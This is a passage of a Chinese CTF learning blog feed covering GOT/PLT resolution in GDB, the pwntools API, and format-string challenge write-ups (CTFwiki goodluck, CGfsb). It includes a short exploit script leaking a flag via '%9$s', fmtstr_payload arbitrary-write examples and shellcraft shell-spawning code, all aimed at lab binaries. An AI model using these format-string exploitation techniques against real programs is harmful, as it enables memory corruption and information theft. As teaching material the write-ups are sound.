    <url>/2021/04/30/%E9%80%9A%E8%BF%87GDB%E8%B0%83%E8%AF%95%E7%90%86%E8%A7%A3GOT%E8%A1%A8%E5%92%8CPLT%E8%A1%A8/</url>
    
    <content type="html"><![CDATA[<p>（清楚下述动态解析的过程，有助于理解GOT覆写利用）</p><p>关于Linux中ELF文件格式可以参考文档《ELF_Format》<br>文档链接：<a href="http://flint.cs.yale.edu/cs422/doc/ELF_Format.pdf">http://flint.cs.yale.edu/cs422/doc/ELF_Format.pdf</a><br>GOT（Global Offset Table）: 全局偏移表用于记录在ELF文件中所用到的共享库的绝对地址。在程序刚开始运行时，GOT表项是空的，当符号第一次被调用时会动态解析符号的绝对地址然后转去执行，并将被解析符号的绝对地址记录在GOT表中，第二次调用同一符号时，由于GOT表中已经记录了其绝对地址，直接转去执行即可（不用重新解析）。</p><p>PLT（Procedure Linkage Table）: 过程链接表的作用是将位置无关的符号转移到绝对地址。当一个外部符号被调用时，PLT去引用GOT中的其符号对应的绝对地址，然后转入并执行。</p><p>GOT位于.got.plt的section中，而PLT位于.plt的section中。下面给出一示例程序：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#include&lt;stdio.h&gt;</span></span><br><span class="line"><span class="comment">#include&lt;stdlib.h&gt;</span></span><br><span class="line">int main(int argc,char* argv[])&#123;</span><br><span class="line"><span class="keyword">if</span>(argc&lt;2)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;argv[1] required!\n&quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(0);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;You input:&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;argv[1]);</span></span><br><span class="line"><span class="string">printf(&quot;</span>Down\n<span class="string">&quot;)</span></span><br><span class="line"><span class="string">return 0;</span></span><br><span class="line"><span class="string">&#125;</span></span><br></pre></td></tr></table></figure><p>编译该程序</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -o format format.c</span><br></pre></td></tr></table></figure><p>然后我们通过readelf命令来查看format程序的section信息，并检查GOT:<br><img src="/2021/04/30/%E9%80%9A%E8%BF%87GDB%E8%B0%83%E8%AF%95%E7%90%86%E8%A7%A3GOT%E8%A1%A8%E5%92%8CPLT%E8%A1%A8/1.png" alt="1.png"><br>从上图可看到，该ELF文件共包含29个section,有关GOT的重定向：<br><img src="/2021/04/30/%E9%80%9A%E8%BF%87GDB%E8%B0%83%E8%AF%95%E7%90%86%E8%A7%A3GOT%E8%A1%A8%E5%92%8CPLT%E8%A1%A8/2.png" alt="2.png"><br>.rel.dyn记录了加载时需要重定位的变量，.rel.plt记录的是需要重定位的函数。</p><p>接下来，我们使用GDB来对程序进行调试，观察程序在调用printf()函数时，GOT的变化情况。</p><p>因为程序逻辑需要输入参数，设置好参数后，在主函数处下断点，然后运行，单步调试来到printf()函数调用的地方:<br><img src="/2021/04/30/%E9%80%9A%E8%BF%87GDB%E8%B0%83%E8%AF%95%E7%90%86%E8%A7%A3GOT%E8%A1%A8%E5%92%8CPLT%E8%A1%A8/3.png" alt="3.png"><br>这里可以看到在0x080484ab处指令为：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">call 0x8048330 &lt;<span class="built_in">printf</span>@plt&gt;</span><br></pre></td></tr></table></figure><p>然后查看一下0x8048330处的代码：<br><img src="/2021/04/30/%E9%80%9A%E8%BF%87GDB%E8%B0%83%E8%AF%95%E7%90%86%E8%A7%A3GOT%E8%A1%A8%E5%92%8CPLT%E8%A1%A8/4.png" alt="4.png"><br>可以看到流程会跳转到ds[0x804a00c]处，而0x804a00c是printf()重定位偏移（查看上面GOT信息图），接着看一下后面的流程都做了什么：<br><img src="/2021/04/30/%E9%80%9A%E8%BF%87GDB%E8%B0%83%E8%AF%95%E7%90%86%E8%A7%A3GOT%E8%A1%A8%E5%92%8CPLT%E8%A1%A8/5.png" alt="5.png"><br>根据上面的流程分析，进行单步调试，当动态解析（_dl_runtime_resolve）完成后，流程会直接跳转到printf()函数主体：<br><img src="/2021/04/30/%E9%80%9A%E8%BF%87GDB%E8%B0%83%E8%AF%95%E7%90%86%E8%A7%A3GOT%E8%A1%A8%E5%92%8CPLT%E8%A1%A8/6.png" alt="6.png"><br>上面我们说过，当第一次调用动态符号时会动态解析其绝对地址并写到GOT中，下次调用的时候就不用再次解析了，我们来看看这个时候原先0x804a00c处的指向情况：<br><img src="/2021/04/30/%E9%80%9A%E8%BF%87GDB%E8%B0%83%E8%AF%95%E7%90%86%E8%A7%A3GOT%E8%A1%A8%E5%92%8CPLT%E8%A1%A8/7.png" alt="7.png"><br>其所指向的地址正好为第一次解析后得到的printf()函数的入口地址。<br>程序中，printf()函数调用过程可以总结为：<br><img src="/2021/04/30/%E9%80%9A%E8%BF%87GDB%E8%B0%83%E8%AF%95%E7%90%86%E8%A7%A3GOT%E8%A1%A8%E5%92%8CPLT%E8%A1%A8/8.png" alt="8.png"><br>总结来说就是，GOT保存了程序中所要调用的函数的地址，运行一开时其表项为空，会在运行时实时的更新表项。一个符号调用在第一次时会解析出绝对地址更新到GOT中，第二次调用时就直接找到了GOT表项所存储的函数地址直接调用了。</p><p>（清楚上述动态解析过程，有助于理解GOT的覆写利用）</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>GOT表和PLT表</title>
    <link href="/2021/04/30/GOT%E8%A1%A8%E5%92%8CPLT%E8%A1%A8/"/>
    <url>/2021/04/30/GOT%E8%A1%A8%E5%92%8CPLT%E8%A1%A8/</url>
    
    <content type="html"><![CDATA[<p>GOT表是存储外部函数库的表<br>PLT则是由代码片段组成的，每个代码片段都跳转到GOT表中的一个具体的函数调用</p><h2 id="重定位"><a href="#重定位" class="headerlink" title="重定位"></a>重定位</h2><h3 id="链接时重定位"><a href="#链接时重定位" class="headerlink" title="链接时重定位"></a>链接时重定位</h3><p>链接阶段是将一个或多个中间文件（.o文件）通过链接器将它们链接成一个可执行文件，主要做的事情有：<br>1、对各个中间文件的同名section进行合并<br>2、对代码段、数据段进行地址分配<br>3、进行链接时重定位<br>两种情况：<br>1、如果是在其他中间文件中已经定义了的函数，链接阶段可以直接重定位到函数地址<br>2、如果是在动态库中定义了的函数，链接阶段无法直接重定位到函数地址，只能生成额外的小片段代码，也就是PLT表，然后重定位到该代码片段</p><h3 id="运行时重定位"><a href="#运行时重定位" class="headerlink" title="运行时重定位"></a>运行时重定位</h3><p>运行后加载动态库，把动态库中的相应函数地址填入GOT表，由于PLT表是跳转到GOT表的，这就构成了运行时重定位。</p><h3 id="延迟重定位"><a href="#延迟重定位" class="headerlink" title="延迟重定位"></a>延迟重定位</h3><p>只有动态库函数在被调用时，才会进行地址解析和重定位工作，这时候动态库函数的地址才会被写入到GOT表项中</p><h4 id="函数第一次被调用过程："><a href="#函数第一次被调用过程：" class="headerlink" title="函数第一次被调用过程："></a>函数第一次被调用过程：</h4><p><img src="/2021/04/30/GOT%E8%A1%A8%E5%92%8CPLT%E8%A1%A8/1.webp" alt="1.webp"><br>第一步由函数调用跳入到PLT表中，然后第二步PLT表跳到GOT表中，可以看到第三步由GOT表回跳到PLT表中，这时候进行压栈，把代表函数的ID压栈，接着第四步跳转到公共的PLT表项中，第五步进入到GOT表中，然后_dl_runtime_resolve对动态函数进行地址解析和重定位，第七部把动态杉树的真实地址写入到GOT表项中，然后执行函数并返回。<br>解释下dynamic段，link_map和_dl_runtime_resolve<br>dynamic段：提供动态链接的信息，例如动态链接中各个表的位置<br>link_map:  已加载库的链表,由动态库函数的地址构成的链表<br>_dl_runtime_resolve:  在第一次运行时进行地址解析和重定位工作</p><h4 id="函数之后被调用过程："><a href="#函数之后被调用过程：" class="headerlink" title="函数之后被调用过程："></a>函数之后被调用过程：</h4><p><img src="/2021/04/30/GOT%E8%A1%A8%E5%92%8CPLT%E8%A1%A8/2.webp" alt="2.webp"><br>可以看到，第一步还是由函数调用跳入到PLT表，但是第二步跳入到GOT表中时，由于这个时候该表项已经是动态函数的真实地址了，所以可以直接执行然后返回。</p><p>对于动态函数的调用，第一次要经过地址解析和回写到GOT表项中，第二次直接调用即可。</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Pwntools使用介绍</title>
    <link href="/2021/04/27/pwntools%E5%B8%B8%E7%94%A8%E5%87%BD%E6%95%B0/"/>
    <url>/2021/04/27/pwntools%E5%B8%B8%E7%94%A8%E5%87%BD%E6%95%B0/</url>
    
    <content type="html"><![CDATA[<h3 id="具体内容可以参考pwntools官方文档（Google关键词搜索）"><a href="#具体内容可以参考pwntools官方文档（Google关键词搜索）" class="headerlink" title="具体内容可以参考pwntools官方文档（Google关键词搜索）"></a>具体内容可以参考pwntools官方文档（Google关键词搜索）</h3><h2 id="一、环境变量设置"><a href="#一、环境变量设置" class="headerlink" title="一、环境变量设置"></a>一、环境变量设置</h2><p>pwntools的许多设置都是通过全局变量context进行控制的，例如系统、架构、字节序等都可以通过如下的方法更改：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">context.clear()</span><br><span class="line"><span class="comment">#清空context</span></span><br><span class="line">context.update(arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"><span class="comment">#设置架构类型</span></span><br><span class="line">context.os==<span class="string">&#x27;linux&#x27;</span></span><br><span class="line"><span class="comment">#设置os类型</span></span><br></pre></td></tr></table></figure><h2 id="二、连接及信息传输类API"><a href="#二、连接及信息传输类API" class="headerlink" title="二、连接及信息传输类API"></a>二、连接及信息传输类API</h2><p>要进行漏洞利用，首先就要与程序进行通信，pwntools提供的函数能够与本地或远程进行通信。<br>本地程序通过process函数运行，远程通过remote函数进行连接，示例如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sh=process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">sh=remote(<span class="string">&#x27;127.0.0.1&#x27;</span>,4444)</span><br></pre></td></tr></table></figure><p>通过process函数运行了当前路径下的二进制pwn程序，通过remote函数与127.0.0.1:4444建立连接</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">p=process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line"><span class="comment">#发送信息</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line"><span class="comment">#发送一行信息（自动添加换行符）</span></span><br><span class="line">data=p.recv(count)</span><br><span class="line"><span class="comment">#接受count长度信息</span></span><br><span class="line">data=p.recvuntil(string,drop=True or False)</span><br><span class="line"><span class="comment">#返回直到接收到用户指定的字符串的信息</span></span><br><span class="line">sh.clear()</span><br><span class="line"><span class="comment">#清空消息缓存</span></span><br></pre></td></tr></table></figure><h2 id="三、编码类API"><a href="#三、编码类API" class="headerlink" title="三、编码类API"></a>三、编码类API</h2><p>在漏洞利用的过程中，需要将输入的payload转化为8位、16位、32位或64位、大端或小端所对应的格式。<br>pwntools提供了一组函数用来对给定的数据按照一定的格式进行解码和编码。<br>如：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; p32(0x08040000)</span><br><span class="line"><span class="string">&#x27;\x00\x00\x04\x08&#x27;</span></span><br><span class="line">&gt;&gt;&gt;hex(u32(<span class="string">&#x27;\x00\x00\x04\x08&#x27;</span>))</span><br><span class="line"><span class="string">&#x27;0x08040000&#x27;</span></span><br></pre></td></tr></table></figure><p>pwntools还提供了asm和disasm两个函数进行汇编和反汇编的转换。</p><h2 id="四、文件信息获取类API"><a href="#四、文件信息获取类API" class="headerlink" title="四、文件信息获取类API"></a>四、文件信息获取类API</h2><p>在漏洞利用脚本的编写过程中，经常需要使用got表地址、plt表地址或system函数在libc中的偏移，pwntools能够快速的帮助你找到相应的地址。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">elf=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"><span class="comment">#加载二进制文件</span></span><br><span class="line">elf.got[<span class="string">&#x27;fun_name&#x27;</span>]</span><br><span class="line"><span class="comment">#获取对应函数的got表地址</span></span><br><span class="line">elf.plt[<span class="string">&#x27;fun_name&#x27;</span>]</span><br><span class="line"><span class="comment">#获取对应函数的plt表地址</span></span><br><span class="line">libc=ELF（<span class="string">&#x27;./libc.so.6&#x27;</span>）</span><br><span class="line"><span class="comment">#加载libc函数库</span></span><br><span class="line">libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"><span class="comment">#获取函数地址</span></span><br></pre></td></tr></table></figure><h2 id="五、libc地址计算类API"><a href="#五、libc地址计算类API" class="headerlink" title="五、libc地址计算类API"></a>五、libc地址计算类API</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">sh=process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"><span class="comment">#声明一个只包含一个地址参数的函数</span></span><br><span class="line"><span class="comment">#并且这个函数能够泄露至少位于这个地址的一个字节的数据</span></span><br><span class="line">def leak(address):</span><br><span class="line">data=sh.read(address,4)</span><br><span class="line">log.debug(<span class="string">&#x27;%#x=&gt;%s&#x27;</span>%(address,(data or <span class="string">&#x27;).encode(&#x27;</span>hex<span class="string">&#x27;)))</span></span><br><span class="line"><span class="string">return data</span></span><br><span class="line"><span class="string">d=DynELF(leak,elf=elf)</span></span><br><span class="line"><span class="string">system_addr=d.lookup(&#x27;</span>system<span class="string">&#x27;,&#x27;</span>libc<span class="string">&#x27;)</span></span><br></pre></td></tr></table></figure><h2 id="六、格式化字符串类API"><a href="#六、格式化字符串类API" class="headerlink" title="六、格式化字符串类API"></a>六、格式化字符串类API</h2><p>在格式化字符串利用中，攻击者往往需要通过漏洞实现任意内存地址写，但构造合适的payload往往需要占用大量的时间。<br>pwntools中的fmtstr模块中实现了和格式化字符串漏洞利用相关的多个函数，极大地加速了漏洞利用脚本的开发速度。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt;fmt_payload(5,&#123;0x8041337:0xdeadbeef&#125;,write_size=<span class="string">&#x27;short&#x27;</span>)</span><br><span class="line">7\x13\x04\x089\x13\x04\x08%48871c%5<span class="variable">$hn</span>%8126c%6<span class="variable">$hn</span></span><br></pre></td></tr></table></figure><p>如上代码，通过fmtstr模块中的fmtstr_payload函数，生成一段payload实现修改0x8041337地址内容为0xdeadbeef。</p><h2 id="七、调试类API"><a href="#七、调试类API" class="headerlink" title="七、调试类API"></a>七、调试类API</h2><p>如在进行漏洞利用的过程中，调试几乎是必不可少的一个环节，需要通过调试来查看漏洞利用脚本是否达到了预期摸底或者得到一些关键的信息。<br>pwntools提供了用于在程序运行中调用gdb的函数</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">使用gdb.attach(target,gdbscript=None,exe=None,arch=None)函数来启动gdb调试。</span><br><span class="line"><span class="comment">#target为所要调试的进程</span></span><br><span class="line">gdbscript为gdb脚本字符串，在启动gdb时，会先执行该脚本</span><br><span class="line">exe为所调试进程的二进制文件路径</span><br><span class="line">arch为架构。一般情况下，只需要使用前两个参数即可。</span><br></pre></td></tr></table></figure><h2 id="八、其他漏洞利用类API"><a href="#八、其他漏洞利用类API" class="headerlink" title="八、其他漏洞利用类API"></a>八、其他漏洞利用类API</h2><p>用户可以使用shellcraft.arch.os生成相应架构、系统的shellcode。<br>例如64位linux的shellcraft.amd64.linux,以下为官方文档的示例，通过shellcraft.amd64.linux.sh()可以生成一段Linux64位系统下执行shell的汇编代码。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt;p=run_assembly(shellcraft.amd64.linux.sh())</span><br><span class="line">&gt;&gt;&gt;p=sendline(<span class="string">&#x27;echo Hello&#x27;</span>)</span><br><span class="line">&gt;&gt;&gt;p.recv()</span><br><span class="line"><span class="string">&#x27;Hello\n&#x27;</span></span><br></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>格式化字符串之CTFwiki-Goodluck</title>
    <link href="/2021/04/23/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%B9%8BCTFwiki-goodluck/"/>
    <url>/2021/04/23/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%B9%8BCTFwiki-goodluck/</url>
    
    <content type="html"><![CDATA[<h2 id="献上goodluck的伪代码"><a href="#献上goodluck的伪代码" class="headerlink" title="献上goodluck的伪代码"></a>献上goodluck的伪代码</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  char v4; // [rsp+3h] [rbp-3Dh]</span><br><span class="line">  signed int i; // [rsp+4h] [rbp-3Ch]</span><br><span class="line">  signed int j; // [rsp+4h] [rbp-3Ch]</span><br><span class="line">  char *format; // [rsp+8h] [rbp-38h]</span><br><span class="line">  _IO_FILE *fp; // [rsp+10h] [rbp-30h]</span><br><span class="line">  char *v9; // [rsp+18h] [rbp-28h]</span><br><span class="line">  char v10[24]; // [rsp+20h] [rbp-20h]</span><br><span class="line">  unsigned __int64 v11; // [rsp+38h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  v11 = __readfsqword(0x28u);</span><br><span class="line">  fp = fopen(<span class="string">&quot;flag.txt&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span> ( i = 0; i &lt;= 21; ++i )</span><br><span class="line">    v10[i] = _IO_getc(fp);</span><br><span class="line">  fclose(fp);</span><br><span class="line">  v9 = v10;</span><br><span class="line">  puts(<span class="string">&quot;what&#x27;s the flag&quot;</span>);</span><br><span class="line">  fflush(_bss_start);</span><br><span class="line">  format = 0LL;</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%ms&quot;</span>, &amp;format);</span><br><span class="line">  <span class="keyword">for</span> ( j = 0; j &lt;= 21; ++j )</span><br><span class="line">  &#123;</span><br><span class="line">    v4 = format[j];</span><br><span class="line">    <span class="keyword">if</span> ( !v4 || v10[j] != v4 )</span><br><span class="line">    &#123;</span><br><span class="line">      puts(<span class="string">&quot;You answered:&quot;</span>);</span><br><span class="line">      <span class="built_in">printf</span>(format);</span><br><span class="line">      puts(<span class="string">&quot;\nBut that was totally wrong lol get rekt&quot;</span>);</span><br><span class="line">      fflush(_bss_start);</span><br><span class="line">      <span class="built_in">return</span> 0;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;That&#x27;s right, the flag is %s\n&quot;</span>, v9);</span><br><span class="line">  fflush(_bss_start);</span><br><span class="line">  <span class="built_in">return</span> 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="漏洞点printf-format"><a href="#漏洞点printf-format" class="headerlink" title="漏洞点printf(format);"></a>漏洞点printf(format);</h4><h2 id="程序逻辑"><a href="#程序逻辑" class="headerlink" title="程序逻辑"></a>程序逻辑</h2><p>我们先在本地创建一个flag.txt文件，以保证程序正常运行<br><img src="/2021/04/24/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%B9%8BCTFwiki-goodluck/1.png" alt="1.png"><br>结合伪代码和 ./goodluck 我们发现：<br>程序用 IO_getc 把 flag.txt 读入栈中，然后让我们输入字符串，最后输出字符串。</p><h2 id="献上脚本"><a href="#献上脚本" class="headerlink" title="献上脚本"></a>献上脚本</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line">goodluck = ELF(<span class="string">&#x27;./goodluck&#x27;</span>)</span><br><span class="line">sh = process(<span class="string">&#x27;./goodluck&#x27;</span>)</span><br><span class="line">payload = <span class="string">&quot;%9<span class="variable">$s</span>&quot;</span></span><br><span class="line"><span class="built_in">print</span> payload</span><br><span class="line"><span class="comment">##gdb.attach(sh)</span></span><br><span class="line">sh.sendline(payload)</span><br><span class="line"><span class="built_in">print</span> sh.recv()</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h2 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h2><p>将断点断在printf(fmtstr)上，先后输入<br> r 和 step。发现printf栈帧周围存在已经入栈的flag.txt的内容。<br>发现偏移为4。<br>但是此程序为64位，加上6个寄存器，偏移为10<br>但是%9$s是不包括fmtstr本身的偏移，所以最终偏移为9<br>最后写出脚本，泄露flag.txt.</p><h4 id="有关flag-txt入栈的细节可以自行研究"><a href="#有关flag-txt入栈的细节可以自行研究" class="headerlink" title="有关flag.txt入栈的细节可以自行研究"></a>有关flag.txt入栈的细节可以自行研究</h4>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Pwn学习谷歌关键词</title>
    <link href="/2021/04/19/pwn%E5%AD%A6%E4%B9%A0%E8%B0%B7%E6%AD%8C%E5%85%B3%E9%94%AE%E8%AF%8D/"/>
    <url>/2021/04/19/pwn%E5%AD%A6%E4%B9%A0%E8%B0%B7%E6%AD%8C%E5%85%B3%E9%94%AE%E8%AF%8D/</url>
    
    <content type="html"><![CDATA[<h3 id="XCTF攻防世界"><a href="#XCTF攻防世界" class="headerlink" title="XCTF攻防世界"></a>XCTF攻防世界</h3><h3 id="BUUCTF"><a href="#BUUCTF" class="headerlink" title="BUUCTF"></a>BUUCTF</h3><h3 id="BMZCTF"><a href="#BMZCTF" class="headerlink" title="BMZCTF"></a>BMZCTF</h3><h3 id="pwnable-tw"><a href="#pwnable-tw" class="headerlink" title="pwnable.tw"></a>pwnable.tw</h3><h3 id="CTFwiki"><a href="#CTFwiki" class="headerlink" title="CTFwiki"></a>CTFwiki</h3><h3 id="pwntools官方文档"><a href="#pwntools官方文档" class="headerlink" title="pwntools官方文档"></a>pwntools官方文档</h3>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>那些你不知道的Gdb调试</title>
    <link href="/2021/04/19/%E9%82%A3%E4%BA%9B%E4%BD%A0%E4%B8%8D%E7%9F%A5%E9%81%93%E7%9A%84gdb%E8%B0%83%E8%AF%95/"/>
    <url>/2021/04/19/%E9%82%A3%E4%BA%9B%E4%BD%A0%E4%B8%8D%E7%9F%A5%E9%81%93%E7%9A%84gdb%E8%B0%83%E8%AF%95/</url>
    
    <content type="html"><![CDATA[<h3 id="直接插上CGfsb伪代码"><a href="#直接插上CGfsb伪代码" class="headerlink" title="直接插上CGfsb伪代码"></a>直接插上CGfsb伪代码</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  int buf; // [esp+1Eh] [ebp-7Eh]</span><br><span class="line">  int v5; // [esp+22h] [ebp-7Ah]</span><br><span class="line">  __int16 v6; // [esp+26h] [ebp-76h]</span><br><span class="line">  char s; // [esp+28h] [ebp-74h]</span><br><span class="line">  unsigned int v8; // [esp+8Ch] [ebp-10h]</span><br><span class="line"></span><br><span class="line">  v8 = __readgsdword(0x14u);</span><br><span class="line">  setbuf(stdin, 0);</span><br><span class="line">  setbuf(stdout, 0);</span><br><span class="line">  setbuf(stderr, 0);</span><br><span class="line">  buf = 0;</span><br><span class="line">  v5 = 0;</span><br><span class="line">  v6 = 0;</span><br><span class="line">  memset(&amp;s, 0, 0x64u);</span><br><span class="line">  puts(<span class="string">&quot;please tell me your name:&quot;</span>);</span><br><span class="line">  <span class="built_in">read</span>(0, &amp;buf, 0xAu);</span><br><span class="line">  puts(<span class="string">&quot;leave your message please:&quot;</span>);</span><br><span class="line">  fgets(&amp;s, 100, stdin);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;hello %s&quot;</span>, &amp;buf);</span><br><span class="line">  puts(<span class="string">&quot;your message is:&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(&amp;s);</span><br><span class="line">  <span class="keyword">if</span> ( pwnme == 8 )</span><br><span class="line">  &#123;</span><br><span class="line">    puts(<span class="string">&quot;you pwned me, here is your flag:\n&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;cat flag&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    puts(<span class="string">&quot;Thank you!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">return</span> 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我要调试的是printf指令，这里有两个，我们先调试第一个 printf(“hello %s”, &amp;buf);<br><img src="/2021/04/19/%E9%82%A3%E4%BA%9B%E4%BD%A0%E4%B8%8D%E7%9F%A5%E9%81%93%E7%9A%84gdb%E8%B0%83%E8%AF%95/1.png" alt="1.png"><br>我们将断点先下在第一个断点处，名字输入sakura，信息填message，回车<br><img src="/2021/04/19/%E9%82%A3%E4%BA%9B%E4%BD%A0%E4%B8%8D%E7%9F%A5%E9%81%93%E7%9A%84gdb%E8%B0%83%E8%AF%95/2.png" alt="2.png"><br>你会在backtrace处发现两个栈帧，__libc_start_main栈帧和main栈帧<br><img src="/2021/04/19/%E9%82%A3%E4%BA%9B%E4%BD%A0%E4%B8%8D%E7%9F%A5%E9%81%93%E7%9A%84gdb%E8%B0%83%E8%AF%95/3.png" alt="3.png"><br>注意这个时候的栈信息，栈里面先把sakura对应的地址和格式化字符串分别入栈<br><img src="/2021/04/19/%E9%82%A3%E4%BA%9B%E4%BD%A0%E4%B8%8D%E7%9F%A5%E9%81%93%E7%9A%84gdb%E8%B0%83%E8%AF%95/4.png" alt="4.png"><br>通过step指令由main栈帧进入printf栈帧<br><img src="/2021/04/19/%E9%82%A3%E4%BA%9B%E4%BD%A0%E4%B8%8D%E7%9F%A5%E9%81%93%E7%9A%84gdb%E8%B0%83%E8%AF%95/5.png" 